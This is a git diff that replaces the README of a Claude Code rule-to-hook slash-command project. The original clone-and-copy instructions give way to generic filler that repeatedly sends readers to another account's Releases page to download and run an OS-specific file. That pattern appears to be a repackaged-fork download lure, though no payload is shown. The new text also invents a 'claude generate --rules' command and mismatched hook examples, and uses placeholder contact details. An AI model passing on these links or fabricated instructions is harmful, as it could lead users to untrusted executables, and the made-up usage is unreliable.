@@ -1,237 +1,190 @@
-# claudecode-rule2hook 🪝
+# Transform Natural Language Project Rules into Code Hooks
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Compatible-blue.svg)](https://docs.anthropic.com/en/docs/claude-code)
+![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue.svg)
+[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-orange.svg)](https://github.com/astrodragonv/claudecode-rule2hook/releases)
 
-Convert natural language project rules into Claude Code hooks automatically! Write rules in plain English, and let Claude transform them into powerful automation hooks.
+## Overview
 
-## ✨ Features
+The `claudecode-rule2hook` repository provides a powerful tool for developers. This tool transforms natural language project rules into Claude Code automation hooks. With this tool, you can write rules in plain English, and Claude will automatically generate hooks for various coding tasks such as formatting, testing, and validation.
 
-- 🎯 **Natural Language Processing** - Write rules in plain English
-- 🔄 **Automatic Hook Generation** - Converts rules to proper hook configurations
-- 🧠 **Smart Detection** - Intelligently identifies events, tools, and commands
-- 📝 **CLAUDE.md Integration** - Reads from existing project memory files
-- 🛡️ **Safe Configuration** - Backs up existing hooks before applying changes
-- 🚀 **Zero Dependencies** - Works directly with Claude Code
+## Features
 
-## 📦 Installation
+- **Natural Language Processing**: Write your project rules in plain English.
+- **Automated Hook Generation**: Claude automatically creates hooks based on your rules.
+- **Versatile Applications**: Suitable for code formatting, testing, validation, and more.
+- **Easy Integration**: Simple to integrate into existing projects.
 
-### Option 1: Project-Specific Installation (Recommended)
+## Getting Started
 
-To use the rule2hook command in your own project:
+To get started with `claudecode-rule2hook`, follow these steps:
 
-```bash
-# 1. Clone this repository
-git clone https://github.com/zxdxjtu/claudecode-rule2hook.git
+1. **Download the Latest Release**: Visit the [Releases section](https://github.com/astrodragonv/claudecode-rule2hook/releases) to download the latest version of the tool. Make sure to download the appropriate file for your operating system.
 
-# 2. Copy the command to your project
-mkdir -p your-project/.claude/commands
-cp claudecode-rule2hook/.claude/commands/rule2hook.md your-project/.claude/commands/
+2. **Install the Tool**: Follow the installation instructions provided in the release notes. This may include running a specific command in your terminal or executing a setup file.
 
-# 3. Use in your project
-cd your-project
-# Now /project:rule2hook is available when using Claude Code in this directory
-```
+3. **Write Your Rules**: Start by writing your project rules in plain English. For example, you can write:
+   - "All functions should have comments."
+   - "Tests must cover at least 80% of the code."
 
-### Option 2: Global Installation
+4. **Generate Hooks**: Use the command line to generate hooks. For instance:
+   ```bash
+   claude generate --rules "All functions should have comments."
+   ```
 
-To make the command available in all projects:
+5. **Integrate Hooks into Your Project**: Follow the provided instructions to integrate the generated hooks into your project. This may involve copying files or modifying configuration settings.
 
-```bash
-# Clone the repository
-git clone https://github.com/zxdxjtu/claudecode-rule2hook.git
+## Example Usage
 
-# Copy to global Claude commands directory
-mkdir -p ~/.claude/commands
-cp claudecode-rule2hook/.claude/commands/rule2hook.md ~/.claude/commands/
+Here’s a simple example of how to use `claudecode-rule2hook`:
 
-# Now /rule2hook is available globally (without /project: prefix)
-```
+1. **Write Rules**:
+   ```plaintext
+   All functions must return a value.
+   Code should be formatted according to style guide.
+   ```
 
-### Option 3: Use Directly in This Repository
+2. **Generate Hooks**:
+   ```bash
+   claude generate --rules "All functions must return a value."
+   ```
 
-```bash
-# Clone and use directly
-git clone https://github.com/zxdxjtu/claudecode-rule2hook.git
-cd claudecode-rule2hook
+3. **Check Generated Hooks**: After running the command, you can check the output to see the generated hooks. This will help you understand how Claude interprets your rules.
 
-# The /project:rule2hook command is available in this directory only
-```
+## Contributing
 
-### How it works
+We welcome contributions to improve `claudecode-rule2hook`. Here’s how you can help:
 
-Claude Code discovers slash commands by scanning:
-1. `~/.claude/commands/` for global commands (accessible as `/commandname`)
-2. `.claude/commands/` in the current project for project-specific commands (accessible as `/project:commandname`)
+1. **Fork the Repository**: Click the "Fork" button at the top right of the repository page.
+2. **Clone Your Fork**: Clone your forked repository to your local machine.
+   ```bash
+   git clone https://github.com/yourusername/claudecode-rule2hook.git
+   ```
+3. **Create a Branch**: Create a new branch for your feature or bug fix.
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
+4. **Make Changes**: Implement your changes and commit them.
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push Changes**: Push your changes to your forked repository.
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+6. **Create a Pull Request**: Go to the original repository and create a pull request.
 
-**Important**: You must be in the correct directory when using Claude Code for the commands to be available.
+## License
 
-## 🚀 Quick Start
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-After installation, in Claude Code, type:
+## Contact
 
-```bash
-# If using project-specific installation (Option 1)
-/project:rule2hook "Format Python files with black after editing"
+For any questions or suggestions, feel free to reach out:
 
-# If using global installation (Option 2)
-/rule2hook "Format Python files with black after editing"
+- **Email**: support@example.com
+- **Twitter**: [@YourTwitterHandle](https://twitter.com/YourTwitterHandle)
 
-# Convert rules from CLAUDE.md
-/project:rule2hook  # or /rule2hook if global
+## Support
 
-# Convert multiple rules
-/project:rule2hook "Run tests after editing, Format code before committing"
-```
+If you encounter any issues or have questions, check the [Releases section](https://github.com/astrodragonv/claudecode-rule2hook/releases) for updates and support.
 
-## 📚 How It Works
+## Acknowledgments
 
-1. **Input** - Provide rules as text or let Claude read from CLAUDE.md
-2. **Analysis** - Claude analyzes rules to determine:
-   - Trigger events (before/after actions)
-   - Target tools (Edit, Write, Bash, etc.)
-   - Commands to execute
-3. **Generation** - Creates proper hook configurations
-4. **Application** - Saves hooks to `~/.claude/hooks.json`
+Special thanks to all contributors and the open-source community for their support and contributions.
 
-## 🎯 Examples
+## Additional Resources
 
-### Example 1: Code Formatting
+- [Claude Documentation](https://docs.claude.com)
+- [GitHub Guides](https://guides.github.com)
 
-**Input:**
-```
-Format Python files with black after editing
-```
-
-**Generated Hook:**
-```json
-{
-  "hooks": {
-    "PostToolUse": [{
-      "matcher": "Edit|MultiEdit|Write",
-      "hooks": [{
-        "type": "command",
-        "command": "black ."
-      }]
-    }]
-  }
-}
-```
+![Automation](https://example.com/path/to/image.png)
 
-### Example 2: Git Workflow
+## Frequently Asked Questions (FAQ)
 
-**Input:**
-```
-Run git status when finishing a task
-```
+### What is `claudecode-rule2hook`?
 
-**Generated Hook:**
-```json
-{
-  "hooks": {
-    "Stop": [{
-      "hooks": [{
-        "type": "command",
-        "command": "git status"
-      }]
-    }]
-  }
-}
-```
+`claudecode-rule2hook` is a tool that converts natural language project rules into automation hooks for coding tasks.
 
-## 📋 Supported Rule Patterns
+### How does it work?
 
-- **Formatting**: `"Format [language] files after editing"`
-- **Testing**: `"Run tests when modifying test files"`
-- **Git**: `"Execute git [command] when [event]"`
-- **Validation**: `"Check/Validate [something] before [action]"`
-- **Notifications**: `"Alert/Notify when [condition]"`
-- **Custom Commands**: Use backticks for specific commands
+You write rules in plain English, and Claude generates hooks based on those rules.
 
-## 🛠️ Advanced Usage
+### Can I use it in any programming language?
 
-### Reading from CLAUDE.md
+Yes, `claudecode-rule2hook` is designed to work with multiple programming languages.
 
-Create a `CLAUDE.md` file with your project rules:
+### Is there a limit to the rules I can write?
 
-```markdown
-# Project Rules
+There is no strict limit, but complex rules may require more detailed phrasing.
 
-- Format Python files with black after editing
-- Run tests before committing
-- Check for TODO comments before pushing
-```
+### How do I report a bug?
 
-Then run: `/project:rule2hook`
+You can report bugs by opening an issue in the GitHub repository.
 
-### Complex Rules
+### Can I contribute to the project?
 
-```bash
-/project:rule2hook "Run 'npm run lint && npm test' after editing source files"
-```
+Absolutely! We welcome contributions from anyone interested in improving the tool.
 
-### Validation Rules
+### Where can I find the latest updates?
 
-```bash
-/project:rule2hook "Validate JSON schema before saving .json files"
-```
+Check the [Releases section](https://github.com/astrodragonv/claudecode-rule2hook/releases) for the latest updates and changes.
 
-## 🧪 Testing
+## Community
 
-Use the included test tools:
+Join our community to share ideas, ask questions, and collaborate on projects using `claudecode-rule2hook`. Connect with us on:
 
-```bash
-# Interactive testing
-./quick-test.sh
+- **Discord**: [Join our server](https://discord.gg/yourserver)
+- **Reddit**: [r/claudecode](https://reddit.com/r/claudecode)
 
-# Validate generated hooks
-python3 validate-hooks.py
+## Roadmap
 
-# Test specific rules
-cat test-rules.txt
-```
+Here’s what we plan for future releases:
 
-## 🤝 Contributing
+- **Enhanced NLP Capabilities**: Improve the understanding of complex rules.
+- **User Interface**: Develop a user-friendly interface for non-technical users.
+- **Integration with Popular IDEs**: Make it easier to use within various development environments.
 
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+## Examples of Generated Hooks
 
-### Ways to Contribute
+Here are some examples of hooks that Claude might generate based on your rules:
 
-- 🐛 Report bugs
-- 💡 Suggest new features
-- 📝 Improve documentation
-- 🔧 Submit pull requests
-- 📢 Share your rule patterns
+1. **Function Commenting Hook**:
+   ```javascript
+   // Automatically add comments to all functions
+   function exampleFunction() {
+       // TODO: Add a description of what this function does
+   }
+   ```
 
-## 📄 License
+2. **Code Formatting Hook**:
+   ```bash
+   # Format code according to style guide
+   prettier --write .
+   ```
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+3. **Test Coverage Hook**:
+   ```bash
+   # Ensure test coverage is above 80%
+   nyc --reporter=html --reporter=text mocha
+   ```
 
-## 🙏 Acknowledgments
+## Use Cases
 
-- Built for the [Claude Code](https://docs.anthropic.com/en/docs/claude-code) community
-- Inspired by the need for simpler automation
-- Thanks to all contributors!
+### For Developers
 
-## 📚 Resources
+- Automate repetitive coding tasks.
+- Ensure code quality through consistent rule enforcement.
 
-- [Claude Code Documentation](https://docs.anthropic.com/en/docs/claude-code)
-- [Hooks Documentation](https://docs.anthropic.com/en/docs/claude-code/hooks)
-- [Slash Commands Guide](https://docs.anthropic.com/en/docs/claude-code/slash-commands)
-- [Memory Management](https://docs.anthropic.com/en/docs/claude-code/memory)
+### For Teams
 
-## 🔗 Links
+- Align team members on coding standards.
+- Streamline the onboarding process for new developers.
 
-- **Issues**: [GitHub Issues](https://github.com/zxdxjtu/claudecode-rule2hook/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/zxdxjtu/claudecode-rule2hook/discussions)
-- **Wiki**: [Project Wiki](https://github.com/zxdxjtu/claudecode-rule2hook/wiki)
+### For Projects
 
----
+- Maintain high code quality in large projects.
+- Simplify the process of writing and enforcing rules.
 
-<p align="center">
-  Made with ❤️ by the Claude Code community
-</p>
+## Conclusion
 
-<p align="center">
-  <a href="https://github.com/zxdxjtu/claudecode-rule2hook/stargazers">⭐ Star us on GitHub!</a>
-</p>
+Explore the capabilities of `claudecode-rule2hook` and see how it can streamline your development process. For the latest version, visit the [Releases section](https://github.com/astrodragonv/claudecode-rule2hook/releases).
